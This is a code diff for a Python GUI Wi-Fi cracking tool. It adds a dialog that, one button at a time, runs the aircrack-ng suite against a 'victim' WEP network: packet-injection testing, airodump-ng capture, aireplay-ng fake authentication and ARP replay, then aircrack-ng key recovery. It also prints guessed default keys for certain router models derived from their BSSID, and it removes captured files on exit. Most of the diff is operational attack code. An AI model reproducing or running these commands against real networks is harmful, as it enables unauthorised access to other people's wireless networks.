@@ -20,6 +20,7 @@ class Client(QDialog):
         self.essid = victim[0]
         self.channel = victim[2]
         super(Client, self).__init__(parent)
+        self.setFixedSize(350, 300)
 
         self.le = QLineEdit()
         self.le.setObjectName("host")
@@ -137,7 +138,78 @@ class Client(QDialog):
         if(self.keyfound == False):
             print 'Key is not in the list'
 
+class WEP_Crack(QDialog):
+    def __init__(self,victim,device_mac, parent=None):
+        self.bssid = victim[1]
+        self.victim = victim
+        self.essid = victim[0]
+        self.channel = victim[2]
+        self.host_mac = device_mac
+        super(Client, self).__init__(parent)
+        self.setFixedSize(350, 300)
 
+        self.ti = QPushButton()
+        self.ti.setObjectName("wep_test_inject")
+        self.ti.setText("Check WEP Injection") 
+
+        self.si = QPushButton()
+        self.si.setObjectName("start_wep_injection")
+        self.si.setText("Start Airodump Capture")
+
+        self.fa = QPushButton()
+        self.fa.setObjectName("fake_auth")
+        self.fa.setText("Start Fake Authentication")
+
+        self.ca = QPushButton()
+        self.ca.setObjectName("capture_packers")
+        self.ca.setText("Capture packets")
+
+        self.ck = QPushButton()
+        self.ck.setObjectName("crack_key")
+        self.ck.setText("Crack the Key")
+
+        layout = QFormLayout()
+        layout.addWidget(self.ti)
+        layout.addWidget(self.si)
+        layout.addWidget(self.fa)
+        layout.addWidget(self.ca)
+        layout.addWidget(self.ck)
+
+        self.setLayout(layout)
+        self.connect(self.ti, SIGNAL("clicked()"),self.test_inject)
+        self.connect(self.si, SIGNAL("clicked()"),self.wpe_airodump_capture)
+        self.connect(self.fa, SIGNAL("clicked()"),self.fake_authentication)
+        self.connect(self.ca, SIGNAL("clicked()"),self.capture_wpe_packers)
+        self.connect(self.ck, SIGNAL("clicked()"),self.crack_wpe_key)
+        self.setWindowTitle("Learning")
+
+
+
+    def test_inject(self):
+        injection_test = 'aireplay-ng -9 -e ' + self.essid + ' -a ' + self.bssid + '--ignore-negative-one mon0'
+        ct = Command_thread(str(injection_test))
+        ct.start()
+
+    def wpe_airodump_capture(self):
+        airodump_capture = 'airodump-ng -c ' + self.channel + ' --bssid ' + self.bssid + ' -w output mon0'
+        ct = Command_thread(str(airodump_capture))
+        ct.start()
+
+    def fake_authentication(self):
+        fake_auth = 'aireplay-ng -1 6000 -o 1 -q 10 -e ' + self.essid + ' -a ' + self.bssid + ' -h ' + self.host_mac + ' mon0'
+        ct = Command_thread(str(fake_auth))
+        ct.start()
+
+    def capture_wpe_packers(self):
+        capture_ivs = 'aireplay-ng -3 -b ' + self.bssid + ' -h ' + self.host_mac + ' mon0'
+        ct = Command_thread(str(capture_ivs))
+        ct.start()
+
+
+    def crack_wpe_key(self):
+        fake_auth = 'aircrack-ng -b ' + self.bssid + ' output*.cap'
+        ct = Command_thread(fake_auth)
+        ct.start()
 
 
 class Main_window_ex(QMainWindow, Ui_Main_window):
@@ -167,10 +239,11 @@ class Main_window_ex(QMainWindow, Ui_Main_window):
 
         if reply == QtGui.QMessageBox.Yes:
             if self.start_procedure_is_pressed == True:
-                disable_monitor_mode(self.device_interface)                             #[SUCCESS]
+                disable_monitor_mode('mon0')                             #[SUCCESS]
                 start_network_manager()                                                 #[SUCCESS]
                 commands.getstatusoutput('rm wifi-scan*')
                 commands.getstatusoutput('rm output*')
+                commands.getstatusoutput('rm netfasterkeys.txt')
             print 'programm exit: SUCCESS'
             event.accept()
         else:
@@ -191,7 +264,7 @@ class Main_window_ex(QMainWindow, Ui_Main_window):
             print 'The network is open. Go connect! :)'
 
         elif self.encryption == 'WEP':
-            get_wpe_capture_file(self.essid, self.bssid, self.channel, self.device_mac)
+            self.wep = WEP_Crack(self.victim, self.device_mac)
 
         elif self.encryption == 'WPA' or self.encryption == 'WPA2' or self.encryption == 'WPA2WPA':
             self.w = Client(self.victim)
@@ -208,7 +281,7 @@ class Main_window_ex(QMainWindow, Ui_Main_window):
             elif self.essid[0:6] == 'conn-x':
                 if self.essid[6:12] == self.bssid[9:17].replace(':','').lower():
                     print 'key is ' + self.bssid.replace(':','').lower()
-                     print 'try that key too ' + '1234567890123'
+                    print 'try that key too ' + '1234567890123'
                 else:
                     print 'try that key ' + '1234567890123'
             elif self.essid[0:4] ==  'OTE':
